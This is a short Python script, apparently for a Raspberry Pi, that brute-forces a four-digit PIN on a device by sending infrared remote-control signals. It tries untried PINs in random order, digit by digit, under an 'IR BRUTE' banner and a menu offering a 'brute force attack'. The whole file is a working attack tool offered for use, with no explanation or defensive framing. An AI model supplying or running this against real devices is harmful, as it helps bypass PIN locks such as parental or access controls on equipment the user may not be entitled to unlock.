#Importing the necessary modules.
import piir
import random
import time

#Each function transmits an IR signal corresponding to a specific digit.
def generateDigit0():
    remote = piir.Remote('pigpio-master/Remote.json', 17)
    remote.send('0')

def generateDigit1():
    remote = piir.Remote('pigpio-master/Remote.json', 17)
    remote.send('1')

def generateDigit2():
    remote = piir.Remote('pigpio-master/Remote.json', 17)
    remote.send('2')

def generateDigit3():
    remote = piir.Remote('pigpio-master/Remote.json', 17)
    remote.send('3')

def generateDigit4():
    remote = piir.Remote('pigpio-master/Remote.json', 17)
    remote.send('4')

def generateDigit5():
    remote = piir.Remote('pigpio-master/Remote.json', 17)
    remote.send('5')

def generateDigit6():
    remote = piir.Remote('pigpio-master/Remote.json', 17)
    remote.send('6')

def generateDigit7():
    remote = piir.Remote('pigpio-master/Remote.json', 17)
    remote.send('7')

def generateDigit8():
    remote = piir.Remote('pigpio-master/Remote.json', 17)
    remote.send('8')

def generateDigit9():
    remote = piir.Remote('pigpio-master/Remote.json', 17)
    remote.send('9')

#Function to produce every possible combination of four-digit PIN.
def generateAllPINs():
    allPINs = []
    for i in range(10000):
        PIN = str(i).zfill(4)
        allPINs.append(PIN)
    return allPINs

#Function to produce a random four-digit PIN.
def generatePIN(allPINs):
    PIN = random.choice(allPINs)
    return PIN

#Function to use a brute force approach to guess a four-digit PIN.
def guessPIN():

    #Initialise the attempts counter.
    attempts = 0

    #Generate all possible four-digit PINs.
    allPINs = generateAllPINs()

    while True:

        #Generate a random four-digit PIN.
        guessedPIN = generatePIN(allPINs)
        print('Guessing:', guessedPIN)

        #Increment the attempts counter.
        attempts += 1

        #Transform the guessed four-digit PIN into a string of digits.
        digits = [int(digit) for digit in guessedPIN]

        #Go through each digit in the guessed four-digit PIN.
        for digit in digits:
            digitFunctionName = f'generateDigit{digit}'
            digitFunction = globals()[digitFunctionName]
            print(f'Sending IR signal for digit {digit} using function: {digitFunctionName}')

            #Call the appropriate function to transmit an IR signal.
            digitFunction()
            time.sleep(0.2)

        #Remove the four-digit PIN that was guessed from the list of all potential four-digit PINs.
        allPINs.remove(guessedPIN)
        time.sleep(3)

#Function to display menu options.
def displayMenu():
    print('1) Brute force attack agaisnt a four-digit PIN.')

#Primary function that controls program execution.
def main():
    print('''

  ██ ██▀███        ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████
▒▓██▓██ ▒ ██▒     ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀
░▒██▓██ ░▄█ ▒     ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███  
 ░██▒██▀▀█▄       ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄
 ░██░██▓ ▒██▒    ▒░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████
 ░▓ ░ ▒▓ ░▒▓░    ░░▒▓███▀▒░ ▒▓ ░▒▓░ ▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ 
  ▒   ░▒ ░ ▒░    ░▒░▒   ░   ░▒ ░ ▒░ ░▒░ ░ ░     ░     ░ ░  
  ▒    ░   ░       ░    ░    ░   ░   ░░ ░ ░   ░ ░       ░  
  ░    ░         ░ ░         ░        ░                 ░  

''')
    
    while True:
        displayMenu()
        choice = input('Enter your choice: ')

        if choice == '1':
            guessPIN()
        else:
            print('Invalid choice. Try again.')
            
if __name__ == '__main__':
    main()
